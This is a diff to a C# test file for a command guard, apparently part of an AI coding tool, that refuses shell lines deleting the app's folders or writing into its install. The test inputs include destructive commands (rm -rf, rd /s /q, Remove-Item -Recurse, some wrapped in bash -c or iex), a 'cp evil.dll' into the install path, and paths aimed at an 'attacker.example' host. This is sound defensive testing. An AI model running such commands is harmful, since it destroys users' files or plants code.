@@ -417,7 +417,8 @@ public sealed class WriteGuardInstallTests : IDisposable
 
         Assert.Null(TrustedFilesPolice.Find("rmdir /s build", guard, out _, "cmd"));
         Assert.Null(TrustedFilesPolice.Find("rmdir /s build", guard));
-        Assert.NotNull(TrustedFilesPolice.Find("cat /s", guard, out _, "bash"));   // Git Bash's own /s is a path
+        Assert.Null(TrustedFilesPolice.Find("cat /s", guard, out _, "bash"));   // Git Bash's own /s is drive S (review P22-6), not that folder
+        Assert.NotNull(TrustedFilesPolice.Find("rm -rf /s", new TrustedFilesPolice.Guard(@"S:\neon", _dir, null, _dir), out _, "bash"));
     }
 
     [UnixFact]
@@ -533,6 +534,19 @@ public sealed class WriteGuardInstallTests : IDisposable
     [InlineData("nohup rm -rf apps")]
     [InlineData("sudo rm -rf apps")]
     [InlineData("xargs rm -rf apps")]
+    [InlineData("cmd /c rd /s /q apps")]
+    [InlineData("pwsh -c \"Remove-Item apps -Recurse\"")]
+    [InlineData("powershell -Command \"Remove-Item apps -Recurse\"")]
+    [InlineData("bash -c \"rm -rf apps\"")]
+    [InlineData("sh -c 'rm -rf apps'")]
+    [InlineData("iex \"rm -rf apps\"")]
+    [InlineData("rm -R *")]
+    [InlineData("rm -fr *")]
+    [InlineData("rm --recursive *")]
+    [InlineData("Remove-Item * -Recurse")]
+    [InlineData("ri * -r")]
+    [InlineData("mv * old")]
+    [InlineData("sudo rm *")]
     public void ADeleteOrMoveOfAFolderHoldingTheApp_IsRefused(string command)
     {
         // Review P19-5, the user's call.
@@ -549,6 +563,14 @@ public sealed class WriteGuardInstallTests : IDisposable
     [InlineData("rm apps/notes.txt")]
     [InlineData("rm *.tmp")]
     [InlineData("rm -rf other")]
+    [InlineData("rm *")]
+    [InlineData("rm -f *")]
+    [InlineData("del *.*")]
+    [InlineData("Remove-Item * -Force")]
+    [InlineData("ri *")]
+    [InlineData("cmd /c dir apps")]
+    [InlineData("pwsh -c \"Get-ChildItem apps\"")]
+    [InlineData("bash -c \"rm apps/notes.txt\"")]
     public void TheRestOfThatList_Passes(string command)
     {
         Assert.Null(TrustedFilesPolice.Find(command, Holding()));
@@ -588,12 +610,266 @@ public sealed class WriteGuardInstallTests : IDisposable
     [InlineData("echo '.update { color: red }' > site.css")]
     [InlineData("cat update-manifest.json .update/x")]
     [InlineData("ls ~")]
+    [InlineData("python -c \"print('hello world')\"")]
+    [InlineData("echo \"a (b) c\" > out.txt")]
+    [InlineData("curl \"https://example.com/a/b?c=d&e=f\"")]
+    [InlineData("dotnet test --filter \"FullyQualifiedName~Foo|Bar\"")]
+    [InlineData("Write-Output \"build: done\"")]
     public void AHarmlessLine_Passes(string command)
     {
         foreach (string kind in new[] { "powershell", "bash", "cmd", "zsh" })
         {
             Assert.Null(TrustedFilesPolice.Find(command, From(Site()), out _, kind));
         }
+    }
+
+    // ---- what review pass 22 found in the police (2026-11-05)
+
+    [WindowsFact]
+    public void APathOnAnotherComputer_IsJudgedBySpellingAlone()
+    {
+        // Review P22-1: a URL split to //host/a/b, a UNC path to Windows, and each ancestor was opened before the approval pane, handing the host the user's credentials.
+        const string Host = "attacker.example";
+        var looked = new List<string>();
+        var cased = new List<string>();
+        using var rule = CaseRule.Override(folder =>
+        {
+            cased.Add(folder);
+            return null;
+        });
+        var guard = From(Site()) with { Looked = looked.Add };
+
+        foreach (string line in new[]
+        {
+            "curl https://" + Host + "/a/b",
+            "copy x.txt \\\\" + Host + "\\share\\y.dll",
+            "copy x.txt //" + Host + "/share/y.dll",
+            "del \\\\" + Host + "\\share\\*.dll",
+            "rm -rf //" + Host + "/share/x",
+            "rm -rf //" + Host + "/share/*",
+            "rm -rf \\\\?\\UNC\\" + Host + "\\share\\x",
+            "// see //" + Host + "/a/b",
+        })
+        {
+            Assert.Null(TrustedFilesPolice.Find(line, guard));
+            Assert.Null(TrustedFilesPolice.Find(line, guard, out _, "python", isScript: true));
+        }
+
+        Assert.DoesNotContain(looked, path => path.Contains(Host, StringComparison.OrdinalIgnoreCase));
+        Assert.DoesNotContain(cased, path => path.Contains(Host, StringComparison.OrdinalIgnoreCase));
+
+        // The hook is live: a local word is looked at.
+        Assert.Null(TrustedFilesPolice.Find("copy x.txt " + Path.Combine(_dir, "other", "a.dll"), guard));
+        Assert.NotEmpty(looked);
+    }
+
+    [WindowsFact]
+    public void OnAShare_TheInstallIsStillRefused_BySpelling()
+    {
+        using var rule = CaseRule.Override(_ => null);
+        const string Install = @"\\files.example\share\neon";
+        var looked = new List<string>();
+        var guard = new TrustedFilesPolice.Guard(null, Install, Install, Install) { Looked = looked.Add };
+
+        Assert.NotNull(TrustedFilesPolice.Find(@"copy x.txt " + Install + @"\a.dll", guard, out var finding));
+        Assert.Equal(TrustedFinding.Install, finding);
+        Assert.NotNull(TrustedFilesPolice.Find(@"rm -rf \\files.example\share", guard, out finding));
+        Assert.Equal(TrustedFinding.HoldsAppFolder, finding);
+        Assert.Null(TrustedFilesPolice.Find(@"copy x.txt \\files.example\share\other\a.dll", guard));
+        Assert.Empty(looked);
+    }
+
+    [WindowsTheory]
+    [InlineData(@"\\host\share\x", true)]
+    [InlineData(@"\\?\UNC\host\share\x", true)]
+    [InlineData(@"\\?\Volume{0}\x", true)]
+    [InlineData(@"\\?\C:\x", false)]
+    [InlineData(@"\\.\C:\x", false)]
+    [InlineData(@"\\localhost\C$\x", false)]
+    [InlineData(@"\\LOCALHOST\C$\x", false)]
+    [InlineData(@"\\127.0.0.1\C$\x", false)]
+    [InlineData(@"\\localhost.example\x\y", true)]
+    [InlineData(@"C:\x", false)]
+    public void IsRemote_TellsAnotherComputerFromASpelling(string path, bool remote)
+    {
+        Assert.Equal(remote, TrustedFilesPolice.IsRemote(path));
+    }
+
+    [WindowsFact]
+    public void TheLoopback_KeepsItsLook()
+    {
+        // The write guard's own example of a spelling around the name (the admin review's M2): \\localhost\D$ reaches nowhere, so it's still found by identity.
+        string local = Path.Combine(_install, "a.dll");
+        string spelled = @"\\localhost\" + local[0] + "$" + local[2..];
+        var looked = new List<string>();
+
+        TrustedFilesPolice.Find("copy x.txt " + spelled, From(Site()) with { Looked = looked.Add });
+
+        Assert.Contains(looked, path => path.StartsWith(@"\\localhost\", StringComparison.OrdinalIgnoreCase));
+    }
+
+    [Fact]
+    public void AHugeWordOfColons_LeavesTheStackAlone()
+    {
+        // Review P22-2: one frame per colon on a few hundred KB of minified JSON ended the whole app, as a stack overflow can't be caught. On a small stack, so a return of the recursion fails here at once.
+        string word = string.Concat(Enumerable.Repeat("a:", 100_000));
+        int count = 0;
+        string? found = "not run";
+        var thread = new Thread(
+            () =>
+            {
+                count = TrustedFilesPolice.ValuesOf(word).Count;
+                found = TrustedFilesPolice.Find("x = " + word, From(Site()), out _, "python", isScript: true);
+            },
+            256 * 1024);
+        thread.Start();
+        thread.Join();
+
+        Assert.Equal(100_000, count);
+        Assert.Null(found);
+    }
+
+    [Theory]
+    [InlineData("os.system(\"rm -rf .git\")", ".git")]
+    [InlineData("subprocess.run('del .neon/x', shell=True)", ".neon/x")]
+    [InlineData("x='a .git/config'", ".git/config")]
+    [InlineData("open('.git/config','w')", ".git/config")]
+    [InlineData("python -c \"os.system('rm -rf .git')\"", ".git")]
+    [InlineData("echo don't touch .git/x it's", ".git/x")]
+    [InlineData("echo \"see CLAUDE.md\"", "CLAUDE.md")]
+    public void AWordHoldingACallOrAString_NamesWhatsInIt(string line, string named)
+    {
+        // Reviews P22-3, P22-4: the old \S+ reading caught these, and words read as a shell reads them didn't.
+        Assert.Equal(named, TrustedFilesPolice.Find(line, From(Site())));
+        Assert.Equal(named, TrustedFilesPolice.Find(line, From(Site()), out _, "python", isScript: true));
+    }
+
+    [Fact]
+    public void AnInstallPath_InACall_IsRefused()
+    {
+        string target = _install.Replace('\\', '/') + "/x.dll";
+
+        Assert.NotNull(TrustedFilesPolice.Find("open('" + target + "','wb')", From(Site()), out var finding, "python", isScript: true));
+        Assert.Equal(TrustedFinding.Install, finding);
+    }
+
+    [WindowsFact]
+    public void AnInstallPath_InACall_KeepsItsDrive()
+    {
+        // Review P22-4: cut at the drive's colon, C:/apps/x.dll read as /apps/x.dll on the drive the command runs from, which is no install.
+        string target = _install.Replace(Path.DirectorySeparatorChar, '/') + "/x.dll";
+        string elsewhere = (char.ToUpperInvariant(_install[0]) == 'Z' ? "Y" : "Z") + @":\site";
+
+        Assert.Equal(target, TrustedFilesPolice.Find("open('" + target + "','wb')", new TrustedFilesPolice.Guard(Home, elsewhere, _install, elsewhere), out var finding, "python", isScript: true));
+        Assert.Equal(TrustedFinding.Install, finding);
+    }
+
+    [Theory]
+    [InlineData("git commit -m \"fix .git/config handling\"")]
+    [InlineData("git commit -m 'update CLAUDE.md (and .neon/x)'")]
+    [InlineData("FOO=1 git commit -m \"see .claude/settings.json\"")]
+    public void AGitLinesMessage_StaysAMessage(string line)
+    {
+        Assert.Null(TrustedFilesPolice.Find(line, From(Site())));
+    }
+
+    [Fact]
+    public void AGitLinesMessage_NamingAnUpdateFile_StaysAMessage_InTheInstall()
+    {
+        // Read in pieces, .update/ready would name a real path from here.
+        Assert.Null(TrustedFilesPolice.Find("git commit -m \"touch .update/ready\"", From(_install)));
+    }
+
+    [WindowsFact]
+    public void GitBashsDriveForm_ReadsAsTheDrive()
+    {
+        // Review P22-6: /d/apps/x.dll resolved to D:\d\apps\x.dll, so the line passed here where the path police saw it inside the root.
+        static string Drive(string path) => "/" + char.ToLowerInvariant(path[0]) + "/" + path[3..].Replace('\\', '/');
+        string line = "cp evil.dll " + Drive(Path.Combine(_install, "x.dll"));
+
+        Assert.NotNull(TrustedFilesPolice.Find(line, From(Site()), out var finding, "bash"));
+        Assert.Equal(TrustedFinding.Install, finding);
+        Assert.NotNull(TrustedFilesPolice.Find(line, From(Site()), out _, "python", isScript: true));
+        Assert.Null(TrustedFilesPolice.Find(line, From(Site()), out _, "powershell"));   // a folder d on this drive, to PowerShell
+
+        var holding = Holding();
+        Assert.NotNull(TrustedFilesPolice.Find("rm -rf " + Drive(Path.Combine(_dir, "apps")), holding, out finding, "bash"));
+        Assert.Equal(TrustedFinding.HoldsAppFolder, finding);
+        Assert.NotNull(TrustedFilesPolice.Find("cat " + Drive(Path.Combine(holding.Home!, "x.json")), holding, out finding, "bash"));
+        Assert.Equal(TrustedFinding.Trusted, finding);
+    }
+
+    [WindowsFact]
+    public void AnIdentityPrefix_OnAWildcard_StillMatches()
+    {
+        // Review P22-7: the ? of \\?\ was a step of its own, so neither of these could match the install or the home.
+        Assert.NotNull(TrustedFilesPolice.Find(@"del \\?\" + _install + @"\*", From(Site()), out var finding));
+        Assert.Equal(TrustedFinding.Install, finding);
+
+        var holding = Holding();
+        Assert.NotNull(TrustedFilesPolice.Find(@"rm -rf \\?\" + Path.Combine(_dir, "apps") + @"\*", new TrustedFilesPolice.Guard(holding.Home, _dir, null, _dir), out finding));
+        Assert.Equal(TrustedFinding.HoldsAppFolder, finding);
+    }
+
+    [Theory]
+    [InlineData("git = shutil.rmtree( '.git' )")]
+    [InlineData("git += '.neon/x'")]
+    [InlineData("git := .git/x")]
+    public void AVariableNamedGit_IsNoGitCommand(string line)
+    {
+        Assert.NotNull(TrustedFilesPolice.Find(line, From(Site()), out _, "python", isScript: true));
+    }
+
+    [Fact]
+    public void AScriptsGitLine_StillSkipsWhatGitOwns()
+    {
+        Assert.Null(TrustedFilesPolice.Find("git add CLAUDE.md\ngit status\n", From(Site()), out _, "bash", isScript: true));
+    }
+
+    [WindowsFact]
+    public void CmdsRecursiveWildcard_IsRefused_ButAFilesOnlyOneIsnt()
+    {
+        // Review P22-9, with both a dotted home (*.* matches it by name) and a plain one (cmd's *.* is every name).
+        string dotted = Path.Combine(_dir, ".neonsidekick");
+        Directory.CreateDirectory(dotted);
+        foreach (var guard in new[] { new TrustedFilesPolice.Guard(dotted, _dir, null, _dir), Holding() })
+        {
+            Assert.NotNull(TrustedFilesPolice.Find("del /s *.*", guard, out var finding, "cmd"));
+            Assert.Equal(TrustedFinding.HoldsAppFolder, finding);
+            Assert.Null(TrustedFilesPolice.Find("del *.*", guard, out _, "cmd"));
+        }
+
+        // Git Bash's *.* needs the dot, and this one has no dotted name to take.
+        Assert.Null(TrustedFilesPolice.Find("rm -rf *.*", Holding(), out _, "bash"));
+    }
+
+    [Fact]
+    public void AWildcardDelete_WithADottedHome_NeedsItsSwitch()
+    {
+        // Review P22-9's own line: in the profile folder, the default home's name has a dot.
+        string dotted = Path.Combine(_dir, ".neonsidekick");
+        Directory.CreateDirectory(dotted);
+        var guard = new TrustedFilesPolice.Guard(dotted, _dir, null, _dir);
+
+        Assert.Null(TrustedFilesPolice.Find("rm -f *", guard));
+        Assert.Null(TrustedFilesPolice.Find("Remove-Item *.* -Force", guard));
+        Assert.NotNull(TrustedFilesPolice.Find("rm -rf *", guard));
+        Assert.NotNull(TrustedFilesPolice.Find("rm -rf *.*", guard));
+    }
+
+    [Fact]
+    public void ARepeatedDelete_IsJudgedOnce()
+    {
+        // Review P22-15: 1,000 rm lines opened every ancestor twice per word before the pane.
+        var once = new List<string>();
+        var many = new List<string>();
+        var holding = Holding();
+
+        TrustedFilesPolice.Find("rm x.txt", holding with { Looked = once.Add }, out _, "bash", isScript: true);
+        TrustedFilesPolice.Find(string.Concat(Enumerable.Repeat("rm x.txt\n", 20)), holding with { Looked = many.Add }, out _, "bash", isScript: true);
+
+        Assert.NotEmpty(once);
+        Assert.Equal(once.Count, many.Count);
     }
 
     [Fact]
